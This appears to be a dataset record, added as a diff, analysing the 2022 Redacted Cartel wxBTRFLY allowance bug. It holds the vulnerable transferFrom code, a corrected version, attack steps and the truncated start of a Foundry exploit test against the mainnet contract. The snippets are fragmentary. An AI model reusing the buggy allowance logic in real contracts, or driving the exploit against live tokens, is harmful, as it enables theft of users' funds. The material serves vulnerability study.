@@ -1,0 +1,35 @@
+{
+ "id": "2022__2022-03-19_RedactedCartel_TransferFromApprovalBug",
+ "source_file": "2022/2022-03-19_RedactedCartel_TransferFromApprovalBug.md",
+ "title": "Redacted Cartel — transferFrom Allowance Bug (Recipient Allowance Hijacking) Analysis",
+ "date": "2022-03-19",
+ "protocol": "Redacted Cartel",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "89,011,248,549,237,373,700 wxBTRFLY (Alice's entire holdings)",
+ "loss_usd": null,
+ "root_cause": "In `transferFrom()`, `_approve()` incorrectly uses `recipient` instead of `msg.sender` as the spender, allowing a third party to hijack the allowance",
+ "attack_tx": null,
+ "vulnerable_contract": "wxBTRFLY 0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable wxBTRFLY.transferFrom() (actual bug)\nfunction transferFrom(\n    address sender,\n    address recipient,\n    uint256 amount\n) public virtual override returns (bool) {\n    _transfer(sender, recipient, amount);\n\n    //",
+  "❌ Core bug: uses recipient as the spender\n    // Correct code: allowance(sender, msg.sender).sub(amount)\n    // Buggy code:   allowance(sender, recipient).sub(amount)\n    //              → sets a new allowance for msg.sender equal to sender→recipient allowance\n    _approve(\n        sender,\n        msg.sender,\n        allowance(sender, recipient).sub(   // ← recipient (bug!)\n            amount,\n            \"ERC20: transfer amount exceeds allowance\"\n        )\n    );\n    return true;\n}\n\n//",
+  "// ❌ Root cause: in `transferFrom()`, `_approve()` incorrectly uses `recipient` instead of `msg.sender` as the spender, allowing a third party to hijack the allowance\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);  // ❌ unauthorized transferFrom\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {  // ❌ vulnerability\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }"
+ ],
+ "code_after": [
+  "✅ Correct EIP-20 transferFrom\nfunction transferFrom(\n    address sender,\n    address recipient,\n    uint256 amount\n) public virtual override returns (bool) {\n    _transfer(sender, recipient, amount);\n\n    uint256 currentAllowance = allowance(sender, msg.sender); //",
+  "✅ msg.sender\n    require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n    unchecked {\n        _approve(sender, msg.sender, currentAllowance - amount);\n    }\n    return true;\n}"
+ ],
+ "steps": [
+  "Alice → AliceContract: approve(89,011,248,549,237,373,700 wxBTRFLY)",
+  "Alice → Bob: approve(0)",
+  "_transfer(Alice, AliceContract, 0) → 0 tokens moved",
+  "→ All of Alice's wxBTRFLY allowance is copied to Bob!"
+ ],
+ "other_code": [
+  "_approve(sender, msg.sender, allowance(sender, recipient).sub(amount))",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IwxBTRFLY is IERC20 {\n    function unFreezeToken() external;\n}\n\ncontract ContractTest is Test {\n    IwxBTRFLY wxBTRFLY =\n        IwxBTRFLY(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);\n\n    address alice        = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;\n    address aliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;\n    address bob          = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;\n    address owner        = 0x20B92862dcb9976E0AA11fAE766343B7317aB349;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 13_908_185);\n    }\n\n    function testExploit() public {\n        // [Setup] Unfreeze token\n        vm.prank(owner);\n        wxBTRFLY.unFreezeToken();\n\n      "
+ ]
+}
